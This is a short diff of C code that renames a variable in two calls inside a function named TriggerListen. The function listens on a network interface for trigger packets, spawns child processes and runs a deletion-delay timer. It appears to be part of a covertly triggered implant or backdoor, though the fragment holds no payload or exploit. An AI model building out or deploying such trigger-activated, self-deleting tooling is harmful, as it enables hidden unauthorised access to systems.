@@ -201,7 +201,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 	{
 		if((counter % 100) == 0)
 		{
-			check_timer((char*)sdfp, delete_delay);
+			check_timer((char*)sdcfp, delete_delay);
 		}
 
 		memset( packet_buffer, 0, MAX_PKT );
@@ -267,7 +267,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 
 				tParams->delay = trigger_delay;
 
-				update_file((char*)sdfp);
+				update_file((char*)sdcfp);
 
 				// Create child process... only the parent returns...the child will exit when finished.
 				// Note: same function prototype as pthread_create()
